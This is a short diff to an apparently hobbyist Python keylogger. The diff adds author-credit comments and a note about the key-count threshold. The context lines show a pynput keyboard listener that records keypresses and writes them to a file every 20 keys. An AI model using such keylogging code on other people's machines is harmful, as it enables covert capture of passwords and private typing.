@@ -1,3 +1,7 @@
+#coded by Raj Mehta & Vatsal Sharma 
+#dated 11 Nov 2020
+
+
 from pynput.keyboard import Key, Listener
 
 count = 0
@@ -26,6 +30,7 @@ def on_press(key):
         f.write("\n")
         f.close()
 
+#set count value here
     if count>= 20:
         count=0
         write_file(str(keys))
